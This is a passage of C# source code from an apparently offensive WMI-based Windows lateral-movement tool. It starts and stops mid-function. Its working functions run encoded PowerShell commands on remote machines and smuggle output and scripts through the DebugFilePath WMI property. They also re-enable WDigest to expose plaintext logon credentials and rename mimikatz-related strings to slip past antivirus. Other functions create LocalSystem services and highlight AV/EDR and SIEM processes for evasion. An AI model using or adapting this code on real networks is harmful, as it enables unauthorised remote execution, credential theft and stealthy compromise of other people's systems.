                        "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [byte[]][int[]]$encdata.Split(',') -Join ' '; [byte[]] $decoded = $decode -split ' '; Set-Content -Encoding byte -Force -Path '" +
                        writePath + "' -Value $decoded";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    var fullCommand = "powershell -enc " + encodedCommandB64;

                    cimParams.Add(CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In));

                    // We only need the first instance
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

                    // Give it a second to write
                    System.Threading.Thread.Sleep(1000);
                }

                // Set OSRecovery back to normal pls
                SetOsRecovery(cimSession, originalWmiProperty);

                if (resetEnvSize)
                {
                    // Set the maxEnvelopeSizeKB back to the default val if we set it previously
                    EnvelopeSize.SetLocalMaxEnvelopeSize(500);
                    EnvelopeSize.SetMaxEnvelopeSize("500", cimSession);
                }
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
            }

            return true;
        }

        #endregion


        #region Lateral Movement Facilitation

        public object command_exec(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var command = planter.Commander.Execute;
            string[] newProcs = { "powershell.exe", "notepad.exe", "cmd.exe" };

            // Create a timeout for creating a new process
            var timeout = new TimeSpan(0, 0, 15);


            var originalWmiProperty = GetOsRecovery(cimSession);
            var wsman = true;
            var noDebugCheck = newProcs.Any(command.Split(' ')[0].ToLower().Contains);

            Messenger.GoodMessage("[+] Executing command: " + planter.Commander.Execute);
            Messenger.GoodMessage("--------------------------------------------------------\n");


            if (!planter.Commander.NoPS)
            {
                if (wsman)
                {
                    // We can modify this later easily to pass wsman if needed
                    using (var powershell = PowerShell.Create())
                    {
                        try
                        {
                            if (!string.IsNullOrEmpty(planter.System?.ToString()))
                                powershell.Runspace = RunspaceCreate(planter);
                            else
                            {
                                powershell.Runspace = RunspaceCreateLocal();
                                powershell.AddCommand(command);
                                var result = powershell.Invoke();
                                foreach (var a in result)
                                {
                                    Messenger.Info(a);
                                }

                                return true;
                            }
                        }
                        catch (PSRemotingTransportException)
                        {
                            wsman = false;
                            goto GetOut; // Do this so we're not doing below work when we don't need to
                        }
                        catch (Exception e)
                        {
                            Messenger.Info(e);
                        }

                        if (powershell.Runspace.ConnectionInfo != null)
                        {
                            var command1 = "$data = (" + command + " | Out-String).Trim()";
                            const string command2 = @"$encdata = [Int[]][Char[]]$data -Join ','";
                            const string command3 =
                                @"$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";

                            powershell.Commands.AddScript(command1, false);
                            powershell.Commands.AddScript(command2, false);
                            powershell.Commands.AddScript(command3, false);

                            // If running powershell.exe let's run it and not worry about the output otherwise it will hang for very long time
                            if (noDebugCheck)
                            {
                                // start the timer and get a timeout
                                var startTime = DateTime.Now;
                                var asyncPs = powershell.BeginInvoke();

                                while (asyncPs.IsCompleted == false)
                                {
                                    //Messenger.Info("Waiting for pipeline to finish...");
                                    Thread.Sleep(5000);

                                    // Check on our timeout here
                                    var elasped = DateTime.Now.Subtract(startTime);
                                    if (elasped > timeout)
                                        break;
                                }

                                //powershell.EndInvoke(asyncPs);
                            }
                            else
                            {
                                powershell.Invoke();
                            }
                        }
                        else
                            wsman = false;
                    }
                }

                GetOut:
                if (wsman == false)
                {
                    if (string.IsNullOrEmpty(planter.System?.ToString()))
                    {
                        try
                        {
                            var procStartInfo = new ProcessStartInfo("cmd", "/c " + command)
                            {
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true
                            };

                            var proc = new Process { StartInfo = procStartInfo };
                            proc.Start();

                            // Get the output into a string
                            var result = proc.StandardOutput.ReadToEnd();
                            // Display the command output.
                            Messenger.Info(result);
                        }
                        catch (Exception e)
                        {
                            Messenger.Info(e);
                        }

                        return true;
                    }


                    // Create the parameters and create the new process. Broken out to make it easier to follow what's up
                    var encodedCommand = "$data = (" + command +
                                         " | Out-String).Trim(); $encdata = [Int[]][Char[]]$data -Join ','; $a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $encdata; $a.Put()";
                    var encodedCommandB64 =
                        Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));
                    var fullCommand = "powershell -enc " + encodedCommandB64;

                    var cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("CommandLine", fullCommand, CimFlags.In)
                    };

                    if (noDebugCheck)
                    {
                        // operation options for timeout
                        var operationOptions = new CimOperationOptions
                        {
                            Timeout = TimeSpan.FromMilliseconds(10000),
                        };

                        // Let's create a new instance
                        var cimInstance = new CimInstance("Win32_Process");
                        cimSession.InvokeMethod(planter.NameSpace, cimInstance, "Create", cimParams, operationOptions);
                        Thread.Sleep(20000);
                    }

                    else
                        cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);
                }

                // Give it a second to write
                Thread.Sleep(1000);


                // Give it a second to write and check for changes to DebugFilePath
                Thread.Sleep(1000);

                if (!noDebugCheck)
                {
                    CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                    //Get the contents of the file in the DebugFilePath prop
                    var commandOutput = GetOsRecovery(cimSession).Split(',');
                    var output = new StringBuilder();

                    //Print output.
                    foreach (var integer in commandOutput)
                    {
                        try
                        {
                            var a = (char)Convert.ToInt32(integer);
                            output.Append(a);
                        }
                        catch
                        {
                            //pass
                        }
                    }

                    Messenger.Info(output);
                }
                else
                    Messenger.Info("New process spawned, not checking for output");

                SetOsRecovery(cimSession, originalWmiProperty);

            }

            else
            {
                Messenger.Info("Shhh...Not using PS");

                // Create the parameters and create the new process.
                var cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("CommandLine", planter.Commander.Execute, CimFlags.In)
                    };

                var results = cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

                Messenger.Info(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                ? "Successfully created process"
                : "Issues creating process");
            }

            return true;
        }

        public object disable_wdigest(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            // Create the parameters and create the new process. Broken out to make it easier to follow what's up
            var results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", cimSession);

            var cv = Convert.ToUInt32(results.ReturnValue.Value.ToString());
            if (cv == 0)
            {
                if (results.OutParameters["uValue"].Value.ToString() != "0")
                {
                    // wdigest is enabled, let's disable it
                    var resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", "0", cimSession);

                    if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                        Messenger.Info("Successfully disabled wdigest");
                    else
                        Messenger.Info("Error disabling wdigest");
                }
                else
                    Messenger.Info("wdigest already disabled");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }

            return true;
        }

        public object enable_wdigest(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            // Create the parameters and create the new process. Broken out to make it easier to follow what's up
            // Let's use the already created method we have eh? :)
            var results = RegistryMod.CheckRegistryCim("GetDWORDValue", 0x80000002,
                "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                "UseLogonCredential", cimSession);

            if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0)
            {
                if (results.OutParameters["uValue"].Value.ToString() == "0")
                {
                    // wdigest is disabled, let's enable it
                    var resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002, "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest", "UseLogonCredential", "1", cimSession);

                    if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                        Messenger.Info("Successfully enabled wdigest");
                    else
                        Messenger.Info("Error enabling wdigest");
                }
                else
                    Messenger.Info("wdigest already enabled");
            }
            else if (Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 1)
            {
                // wdigest key is not found, let's create it
                var resultsSet = RegistryMod.SetRegistryCim("SetDWORDValue", 0x80000002,
                    "SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest",
                    "UseLogonCredential", "1", cimSession);

                if (Convert.ToUInt32(resultsSet.ReturnValue.Value.ToString()) == 0)
                    Messenger.Info("Successfully created and enabled wdigest");
                else
                    Messenger.Info("Error enabling wdigest");
            }
            else
            {
                // GetDWORDValue call failed
                throw new PropertyNotFoundException();
            }
            return true;
        }


        public object disable_winrm(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            if (!planter.Commander.NoPS)
            {
                // Create the parameters and create the new process.
                var cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Disable-PSRemoting -Force\"",
                        CimFlags.In)
                };

                // We only need the first instance
                var results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

                // Give it a second to write
                Thread.Sleep(1000);

                Messenger.Info(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully disabled WinRM"
                    : "Issues disabling WinRM");
                return true;
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
                return null;
            }
        }

        public object enable_winrm(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            if (!planter.Commander.NoPS)
            {
                // Create the parameters and create the new process.
                var cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", "powershell -w hidden -command \"Enable-PSRemoting -Force\"",
                        CimFlags.In)
                };

                // We only need the first instance
                var results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

                // Give it a second to write
                Thread.Sleep(1000);

                Messenger.Info(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully enabled WinRM"
                    : "Issues enabled WinRM");
                return true;
            }
            else
            {
                Messenger.YellowMessage("Not running function to avoid any PowerShell usage, remove --nops or pick a new function");
                return null;
            }
        }

        public object registry_mod(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var command = planter.Commander.Command;
            var fullRegKey = planter.Commander.RegKey;
            var regSubKey = planter.Commander.RegSubKey;
            var regValue = planter.Commander.RegVal;
            var passedRegValType = planter.Commander.RegValType;

            var regRootValues = new Dictionary<string, uint>
            {
                { "HKCR", 0x80000000 },
                { "HKEY_CLASSES_ROOT", 0x80000000 },
                { "HKCU", 0x80000001 },
                { "HKEY_CURRENT_USER", 0x80000001 },
                { "HKLM", 0x80000002 },
                { "HKEY_LOCAL_MACHINE", 0x80000002 },
                { "HKU", 0x80000003 },
                { "HKEY_USERS", 0x80000003 },
                { "HKCC", 0x80000005 },
                { "HKEY_CURRENT_CONFIG", 0x80000005 }
            };

            // Shouldn't really need more types for now. This can be added to later on
            string[] regValType = { "REG_SZ", "REG_EXPAND_SZ", "REG_BINARY", "REG_DWORD", "REG_MULTI_SZ" };

            // Grab the root key
            var fullRegKeyArray = fullRegKey.Split(new[] { '\\' }, 2);
            var defKey = fullRegKeyArray[0].ToUpper();
            var regKey = fullRegKeyArray[1];


            //Make sure the root key is valid
            if (!regRootValues.ContainsKey(defKey))
            {
                Messenger.RedMessage("[-] Root registry key needs to be in the correct form and valid (ex: HKCU or HKEY_CURRENT_USER)");
                return null;
            }

            if (command == "reg_create")
            {
                if (!regValType.Any(passedRegValType.ToUpper().Contains))
                {
                    Messenger.RedMessage("[-] Registry value type needs to be in the correct form and valid (REG_SZ, REG_BINARY, or REG_DWORD)");
                    return null;
                }

                // Let's get the proper method depending on the type of data
                var method = new GetMethods(passedRegValType.ToUpper());
                RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue, cimSession);
            }

            string pulledRegValType;
            switch (command)
            {
                case "reg_delete":
                    {
                        // Grab the correct type for the registry data entry
                        GetMethods method = null;
                        try
                        {
                            pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                            method = new GetMethods(pulledRegValType);
                        }
                        catch (TargetInvocationException)
                        {
                            Messenger.RedMessage("[-] Registry key not valid, not modifying or deleting");
                            
                        }
                        catch (IndexOutOfRangeException)
                        {
                            Messenger.RedMessage("[-] Registry key not valid, not modifying or deleting");
                            
                        }

                        var resultDel = RegistryMod.CheckRegistryCim(method.RegGetMethod,
                            regRootValues[defKey], regKey, regSubKey, cimSession);
                        if (Convert.ToUInt32(resultDel.ReturnValue.Value.ToString()) == 0)
                            RegistryMod.DeleteRegistryCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                        else
                        {
                            Messenger.Info("Issue deleting registry value");
                            return null;
                        }
                        break;
                    }
                case "reg_mod":
                    {
                        GetMethods method = null;
                        try
                        {
                            pulledRegValType = RegistryMod.CheckRegistryTypeCim(regRootValues[defKey], regKey, regSubKey, cimSession);
                            method = new GetMethods(pulledRegValType);
                        }
                        catch (TargetInvocationException)
                        {
                            Messenger.RedMessage("[-] Registry key not valid, not modifying or deleting");
                            
                        }
                        catch (IndexOutOfRangeException)
                        {
                            Messenger.RedMessage("[-] Registry key not valid, not modifying or deleting");
                            
                        }

                        //Let's check the reg
                        var resultMod = RegistryMod.CheckRegistryCim(method.RegGetMethod, regRootValues[defKey],
                            regKey, regSubKey, cimSession);
                        if (Convert.ToUInt32(resultMod.ReturnValue.Value.ToString()) == 0)
                        {
                            RegistryMod.SetRegistryCim(method.RegSetMethod, regRootValues[defKey], regKey, regSubKey, regValue,
                                cimSession);
                        }
                        else
                        {
                            Messenger.Info("Issue modifying registry value");
                            return null;
                        }

                        break;
                    }
            }

            return true;
        }

        public object remote_posh(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var powerShellFile = planter.Commander.File;
            var cmdlet = planter.Commander.Cmdlet;

            var originalWmiProperty = GetOsRecovery(cimSession);
            var wsman = true;
            string[] powerShellExtensions = { "ps1", "psm1", "psd1" };
            string modifiedWmiProperty = null;

            if (!File.Exists(powerShellFile))
            {
                Messenger.RedMessage(
                    "[-] Specified local PowerShell script does not exist, not running PS runspace\n");
                return null;
            }

            //Make sure it's a PS script
            if (!powerShellExtensions.Any(Path.GetExtension(powerShellFile).Contains))
            {
                Messenger.RedMessage(
                    "[-] Specified local PowerShell script does not have the correct extension not running PS runspace\n");
                return null;
            }

            Messenger.GoodMessage("[+] Executing cmdlet: " + cmdlet);
            Messenger.GoodMessage("--------------------------------------------------------\n");

            if (wsman == true)
            {
                // We can modify this later easily to pass wsman if needed
                using (var powerShell = PowerShell.Create())
                {
                    try
                    {
                        if (!string.IsNullOrEmpty(planter.Password?.ToString()))
                            powerShell.Runspace = RunspaceCreate(planter);
                        else
                            powerShell.Runspace = RunspaceCreateLocal();
                    }
                    catch (PSRemotingTransportException)
                    {
                        wsman = false;
                    }

                    var script = File.ReadAllText(powerShellFile ?? throw new InvalidOperationException());

                    // Let's remove all comment blocks to save space/keep it from getting flagged
                    script = Regex.Replace(script, @"(?s)<#(.*?)#>", string.Empty);
                    // Let's also remove whitespace
                    script = Regex.Replace(script, @"^\s*$[\r\n]*", string.Empty, RegexOptions.Multiline);
                    // And all comments
                    script = Regex.Replace(script, @"#.*", "");

                    // Let's also modify all functions to random (but keep the name of the one we want)
                    // This is pretty hacky but i think will work for now
                    var functionToRun = RandomString(10);
                    script = Regex.Replace(script, planter.Commander.Cmdlet, functionToRun, RegexOptions.IgnoreCase);
                    //script = script.Replace(planter.Commander.Cmdlet, functionToRun);
                    //script = Regex.Replace(script, @"Function .*", "Function " + RandomString(10), RegexOptions.IgnoreCase);
                    //script = script.Replace(functionToRun, "Function " + functionToRun);


                    // Try to remove mimikatz and replace it with something else along with some other 
                    // replacements from here https://www.blackhillsinfosec.com/bypass-anti-virus-run-mimikatz/
                    script = Regex.Replace(script, @"\bmimikatz\b", RandomString(5), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcreds\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bdumpcerts\b", RandomString(6), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bargumentptr\b", RandomString(4), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc1\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc2\b", RandomString(10), RegexOptions.IgnoreCase);
                    script = Regex.Replace(script, @"\bcalldllmainsc3\b", RandomString(10), RegexOptions.IgnoreCase);

                    if (powerShell.Runspace.ConnectionInfo != null)
                    {
                        // This all works right now but if we see issues down the line with output we may need to throw the output in DebugFilePath property
                        // Will want to add in some obfuscation
                        powerShell.AddScript(script).AddScript("Invoke-Expression ; " + functionToRun);
                        Collection<PSObject> results;
                        try
                        {
                            results = powerShell?.Invoke();
                        }
                        catch (RemoteException e)
                        {
                            Messenger.RedMessage("[-] Error: Issues with PowerShell script, it may have been flagged by AV");
                            Messenger.Info(e);
                            throw new CaughtByAvException(e.Message);
                        }

                        if (results != null)
                            foreach (var result in results)
                            {
                                Messenger.Info(result);
                            }

                        return true;
                    }
                    else
                        wsman = false;
                }
            }

            if (wsman == false)
            {
                var intList = new List<int>();
                var scriptBytes = File.ReadAllBytes(powerShellFile);

                //Convert from byte to int (bytes)
                foreach (var uploadByte in scriptBytes)
                {
                    int a = uploadByte;
                    intList.Add(a);
                }

                SetOsRecovery(cimSession, string.Join(",", intList));

                // Give it a second to write and check for changes to DebugFilePath
                System.Threading.Thread.Sleep(1000);
                CheckForFinishedDebugFilePath(originalWmiProperty, cimSession);

                // Get the debugfilepath again so we can check it later on for longer running tasks
                modifiedWmiProperty = GetOsRecovery(cimSession);

                var encodedCommand =
                    "$a = Get-WmiObject -Class Win32_OSRecoveryConfiguration; $encdata = $a.DebugFilePath; $decode = [char[]][int[]]$encdata.Split(',') -Join ' '; $a | .(-Join[char[]]@(105,101,120));";
                encodedCommand += "$output = (" + cmdlet + " | Out-String).Trim();";
                encodedCommand += " $EncodedText = [Int[]][Char[]]$output -Join ',';";
                encodedCommand +=
                    " $a = Get-WMIObject -Class Win32_OSRecoveryConfiguration; $a.DebugFilePath = $EncodedText; $a.Put()";

                var encodedCommandB64 =
                    "powershell -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(encodedCommand));

                // Create the parameters and create the new process.
                var cimParams = new CimMethodParametersCollection
                {
                    CimMethodParameter.Create("CommandLine", encodedCommandB64, CimFlags.In)
                };

                // We only need the first instance
                var results =
                    cimSession.InvokeMethod(new CimInstance("Win32_Process", planter.NameSpace), "Create", cimParams);

                Messenger.Info(Convert.ToUInt32(results.ReturnValue.Value.ToString()) == 0
                    ? "Successfully enabled WinRM"
                    : "Issues enabled WinRM");

                // Give it a second to write
                System.Threading.Thread.Sleep(1000);
            }

            // Give it a second to write and check for changes to DebugFilePath. Should never be null but we should make sure
            System.Threading.Thread.Sleep(1000);
            if (modifiedWmiProperty != null)
                CheckForFinishedDebugFilePath(modifiedWmiProperty, cimSession);


            //Get the contents of the file in the DebugFilePath prop
            var commandOutput = GetOsRecovery(cimSession).Split(',');
            var output = new StringBuilder();

            //Print output.
            foreach (var integer in commandOutput)
            {
                try
                {
                    var a = (char)Convert.ToInt32(integer);
                    output.Append(a);
                }
                catch
                {
                    //pass
                }
            }

            Messenger.Info(output);
            SetOsRecovery(cimSession, originalWmiProperty);
            return true;
        }

        public object service_mod(Planter planter)
        {
            // For now, let's just view, start, stop, create, and delete a service, eh?
            var cimSession = planter.Connector.ConnectedCimSession;
            var subCommand = planter.Commander.Execute;
            var serviceName = planter.Commander.Service;
            var servicePath = planter.Commander.ServiceBin;

            var legitService = false;
            CimMethodResult results = null;

            const string query = "SELECT * FROM Win32_Service";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

            switch (subCommand)
            {
                case "list":
                    {
                        Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", "Name", "Display Name", "State", "Accept Stopping?");
                        Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", "-----------", "-----------", "-------", "-------");

                        foreach (var cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["DisplayName"].Value != null && cimObject.CimInstanceProperties["Name"].Value != null)
                            {
                                var name = cimObject.CimInstanceProperties["Name"].Value.ToString();
                                if (name.Length > 40)
                                    name = Truncate(name, 40) + "...";
                                var displayName = cimObject.CimInstanceProperties["DisplayName"].Value.ToString();
                                if (displayName.Length > 35)
                                    displayName = Truncate(displayName, 35) + "...";

                                try
                                {
                                    Messenger.Info("{0,-45}{1,-40}{2,15}{3,15}", name, displayName, cimObject.CimInstanceProperties["State"].Value, cimObject.CimInstanceProperties["AcceptStop"].Value);
                                }
                                catch
                                {
                                    //value probably doesn't exist, so just pass
                                }
                            }
                        }

                        break;
                    }
                case "start":
                    {
                        // Let's make sure the service name is valid
                        foreach (var cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                if (cimObject.CimInstanceProperties["State"].Value.ToString() != "Running")
                                    legitService = true;
                                else
                                {
                                    Messenger.YellowMessage("The process is already running, please stop it first");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            // Execute the method and obtain the return values.

                            foreach (var CimObject in cimInstances)
                            {
                                if (CimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                                {
                                    results = cimSession.InvokeMethod(CimObject, "StartService", null);
                                }
                            }

                            // List outParams
                            if (results != null)
                                switch (Convert.ToUInt32(results.ReturnValue.Value))
                                {
                                    case 0:
                                        Messenger.Info($"Successfully started service: {serviceName}");
                                        return queryInstance;
                                    case 1:
                                        Messenger.Info($"The request is not supported for service: {serviceName}");
                                        return null;
                                    case 2:
                                        Messenger.Info(
                                            $"The user does not have the necessary access for service: {serviceName}");
                                        return null;
                                    case 7:
                                        Messenger.Info(
                                            "The service did not respond to the start request in a timely fasion, is the binary an actual service binary?");
                                        return null;
                                    case 8:
                                        Messenger.Info($"The service is likely not a service executable for service: {serviceName}");
                                        return null;
                                    default:
                                        Messenger.Info(
                                            $"The service: {serviceName} was not started. Return code:  {Convert.ToUInt32(results.ReturnValue.Value)}");
                                        return null;
                                }
                        }

                        else
                        {
                            throw new ServiceUnknownException(serviceName);
                        }
                        break;
                    }

                case "stop":
                    {
                        // Let's make sure the service name is valid
                        foreach (var cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Running" && cimObject.CimInstanceProperties["AcceptStop"].Value.ToString() == "True")
                                    legitService = true;
                                else
                                {
                                    Messenger.YellowMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            try
                            {
                                // Execute the method and obtain the return values.
                                foreach (var cimObject in cimInstances)
                                {
                                    if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                                    {
                                        results = cimSession.InvokeMethod(cimObject, "StopService", null);
                                    }
                                }

                                // List outParams
                                switch (Convert.ToUInt32(results.ReturnValue.Value))
                                {
                                    case 0:
                                        Messenger.Info($"Successfully stopped service: {serviceName}");
                                        return queryInstance;
                                    case 1:
                                        Messenger.Info($"The request is not supported for service: {serviceName}");
                                        return null;
                                    case 2:
                                        Messenger.Info($"The user does not have the necessary access for service: {serviceName}");
                                        return null;
                                    default:
                                        Messenger.Info($"The service: {serviceName} was not stopped. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                                        return null;
                                }
                            }
                            catch (Exception e)
                            {
                                Messenger.Info($"Exception {e.Message} Trace {e.StackTrace}");
                                return null;
                            }
                        }
                        else
                        {
                            throw new ArgumentNullException(serviceName);
                        }
                    }
                case "delete":
                    {
                        // Let's make sure the service name is valid
                        foreach (var cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Running" && cimObject.CimInstanceProperties["AcceptStop"].Value.ToString() == "True")
                                {
                                    // Let's stop the service
                                    legitService = true;
                                    results = cimSession.InvokeMethod(new CimInstance(
                                        $"Win32_Process.Name='{serviceName}'", planter.NameSpace), "StopService", null);

                                    if (Convert.ToUInt32(results.ReturnValue.Value) != 0)
                                        Messenger.YellowMessage("[-] Warning: Unable to stop the service before deletion. Still marking the service to be deleted after stopping");
                                }
                                else if (cimObject.CimInstanceProperties["State"].Value.ToString() == "Stopped")
                                {
                                    legitService = true;
                                }

                                else
                                {
                                    Messenger.YellowMessage("The process is not running or does not accept stopping, please start it first or try another service");
                                    return null;
                                }
                            }
                        }

                        if (legitService)
                        {
                            foreach (var cimObject in cimInstances)
                            {
                                if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                                {
                                    results = cimSession.InvokeMethod(cimObject, "Delete", null);
                                }
                            }

                            // List outParams
                            if (results != null)
                                switch (Convert.ToUInt32(results.ReturnValue.Value))
                                {
                                    case 0:
                                        Messenger.Info($"Successfully deleted service: {serviceName}");
                                        return queryInstance;
                                    case 1:
                                        Messenger.Info($"The request is not supported for service: {serviceName}");
                                        return null;
                                    case 2:
                                        Messenger.Info(
                                            $"The user does not have the necessary access for service: {serviceName}");
                                        return null;
                                    default:
                                        Messenger.Info(
                                            $"The service: {serviceName} was not stopped. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                                        return null;
                                }
                        }

                        else
                        {
                            throw new ServiceUnknownException(serviceName);
                        }

                        break;
                    }
                case "create":
                    {
                        // Let's make sure the service name is not already used
                        foreach (var cimObject in cimInstances)
                        {
                            if (cimObject.CimInstanceProperties["Name"].Value.ToString() == serviceName)
                            {
                                Messenger.RedMessage("The process name provided already exists, please specify another one");
                                return null;
                            }
                        }

                        // Add the in-parameters for the method
                        var cimParams = new CimMethodParametersCollection
                    {
                        CimMethodParameter.Create("Name", serviceName, CimFlags.In),
                        CimMethodParameter.Create("DisplayName", serviceName, CimFlags.In),
                        CimMethodParameter.Create("PathName", servicePath, CimFlags.In),
                        CimMethodParameter.Create("ServiceType", byte.Parse("16"), CimFlags.In),
                        CimMethodParameter.Create("ErrorControl", byte.Parse("2"), CimFlags.In),
                        CimMethodParameter.Create("StartMode", "Automatic", CimFlags.In),
                        CimMethodParameter.Create("DesktopInteract", true, CimFlags.In),
                        CimMethodParameter.Create("StartName", ".\\LocalSystem", CimFlags.In),
                        CimMethodParameter.Create("StartPassword", "", CimFlags.In)
                    };

                        // Execute the method and obtain the return values.
                        results = cimSession.InvokeMethod(new CimInstance("Win32_Service", planter.NameSpace), "Create", cimParams);

                        // List outParams
                        switch (Convert.ToUInt32(results.ReturnValue.Value))
                        {
                            case 0:
                                Messenger.Info($"Successfully created service: {serviceName}");
                                return queryInstance;
                            case 1:
                                Messenger.Info($"The request is not supported for service: {serviceName}");
                                return null;
                            case 2:
                                Messenger.Info($"The user does not have the necessary access for service: {serviceName}");
                                return null;
                            default:
                                Messenger.Info(
                                    $"The service: {serviceName} was not created. Return code: {Convert.ToUInt32(results.ReturnValue.Value)}");
                                return null;
                        }
                    }
            }

            return queryInstance;
        }

        public object ps(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;

            const string query = "SELECT * FROM Win32_Process";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", query);

            Messenger.Info("{0,-50}{1,15}", "Name", "Handle");
            Messenger.Info("{0,-50}{1,15}", "-----------", "---------");

            foreach (var cimObject in queryInstance)
            {
                var name = cimObject.CimInstanceProperties["Name"].Value.ToString().Trim().TrimEnd();
                if (name.Length > 45)
                    name = Truncate(name, 45) + "...";


                try
                {
                    if (SharedGlobals.AVs.Any(name.ToLower().Equals))
                    {
                        // Make AV/EDR pop
                        Messenger.RedMessage("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value?.ToString().Trim().TrimEnd());
                    }
                    else if (SharedGlobals.Admin.Any(name.ToLower().Equals))
                    {
                        // Make admin tools pop
                        Messenger.BlueMessage("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value?.ToString().Trim().TrimEnd());
                    }
                    else if (SharedGlobals.SIEM.Any(name.ToLower().Equals))
                    {
                        // SIEM Agent
                        Messenger.YellowMessage("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value?.ToString().Trim().TrimEnd());
                    }
                    else
                        Messenger.Info("{0,-50}{1,15}", name, cimObject.CimInstanceProperties["Handle"].Value?.ToString().Trim().TrimEnd());
                }
                catch
                {
                    //value probably doesn't exist, so just pass
                }
            }

            Messenger.BlueMessage("\nDenotes a potential admin tool");
            Messenger.RedMessage("Denotes a potential AV/EDR product");
            Messenger.YellowMessage("Denotes a potential SIEM agent");
            return queryInstance;
        }

        public object process_kill(Planter planter)
        {
            var cimSession = planter.Connector.ConnectedCimSession;
            var processToKill = planter.Commander.Process;

            var procDict = new Dictionary<string, string>();

            // Grab all procs so we can build the dictionary
            const string query = "SELECT * FROM Win32_Process";
            var queryInstance = cimSession.QueryInstances(planter.NameSpace, "WQL", query);
            IEnumerable<CimInstance> cimInstances = queryInstance as CimInstance[] ?? queryInstance.ToArray();

